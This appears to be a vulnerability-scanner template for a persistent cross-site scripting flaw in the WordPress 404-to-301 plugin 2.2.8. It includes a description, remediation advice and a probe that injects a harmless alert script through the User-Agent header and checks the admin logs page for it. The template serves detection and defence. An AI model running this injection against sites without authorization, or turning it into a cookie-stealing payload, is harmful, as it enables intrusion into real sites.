id: Wordpress-Plugin_404-XSS
info:
  name: WordPress Plugin 404 to 301 2.2.8 - Persistent Cross-Site Scripting
  author:
  - l0ne1y
  description: |-
    WordPress Plugin 404-to-301 cross-site scripting vulnerability
    WordPress is a blogging platform developed by the WordPress Foundation using the PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. 404-to-301 is a plugin used to redirect 404 pages to other pages.

    There is a cross-site scripting vulnerability in version 2.2.8 of the WordPress 404-to-301 plugin. The vulnerability results from failure to validate user-supplied input. An attacker can exploit this vulnerability to execute arbitrary script code in an unspecified user's browser in the context of an affected site, and can steal cookie-based authentication certificates to launch other attacks.
  severity: medium
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/404-to-301/#developers

    Temporary fix:
    1. Filter the input (and URL parameters), encode the output, and combine the whitelist and blacklist. That is to say, filter all submitted content, filter the parameters in the URL, and filter out relevant content that will cause the script to be executed; and then HTML-encode the content dynamically output to the page so that the script cannot be executed in the browser. Although input filtering can be bypassed, a large number of XSS attacks will still be intercepted; finally, characters are whitelisted or blacklisted.
requests:
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"<script>alert(/hi/)</script>")
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-admin/admin.php?page=i4t3-logs'
  method: GET
  headers:
    User-Agent: <script>alert(/hi/)</script>
